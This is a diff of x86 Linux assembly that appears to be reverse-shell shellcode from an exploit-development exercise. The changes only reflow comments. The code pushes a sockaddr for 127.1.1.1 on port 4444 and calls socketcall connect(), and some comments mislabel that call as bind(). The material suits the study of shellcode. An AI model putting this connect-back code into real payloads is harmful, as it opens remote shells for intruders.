@@ -110,8 +110,10 @@ push bx	         ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
 mov ecx, esp     ; Point ECX to the top of the stack. This will be used for ECX[1].
 push 0x10        ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
 push ecx         ; ECX[1] - const struct sockaddr *addr // pointer to sockaddr
-push esi         ; ECX[0] - int sockfd // Saved in ESI earlier after creating the socket.	
-mov ecx, esp     ; Stack is all loaded. We now need to point ECX to the top of the Stack.
+push esi         ; ECX[0] - int sockfd 
+                 ;          Saved in ESI earlier after creating the socket.
+mov ecx, esp     ; Stack is all loaded. 
+                 ;   We now need to point ECX to the top of the Stack.
 inc ebx          ; Connect() value for the socketcall() SYSCAL
 mov al, 0x66     ; socketcall() system call
 int 0x80         ; System Call Interrupt 0x80 - Executes bind(). 
@@ -194,15 +196,15 @@ xor eax, eax
 inc ebx
 push 0x0101017f   ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
 push word 0x3905  ; ARG[1]. This is for the TCP Port 4444.
-push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
+push bx           ; ARG[0]. Push the value 2 onto the stack for AF_INET.
 mov ecx, esp      ; Now all that is left is to point ECX to the top of the 
                   ;  loaded stack and let it do it's thing.
 
 push 0x10         ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
-push ecx          ; ECX[1] - const struct sockaddr *addr // pointer to sockaddr
-push esi          ; ECX[0] - int sockfd. Saved in ESI earlier after creating the socket.	
+push ecx          ; ECX[1] - const struct sockaddr *addr 
+push esi          ; ECX[0] - int sockfd. Saved in ESI earlier
 
-mov ecx, esp      ; Stack is loaded. We now need to point ECX to the top of the Stack.
+mov ecx, esp      ; Point ECX to the top of the Stack.
 inc ebx	          ; Connect() value for the socketcall() SYSCAL
 mov al, 0x66      ; socketcall() system call
 int 0x80          ; System Call Interrupt 0x80 - Executes bind(). 
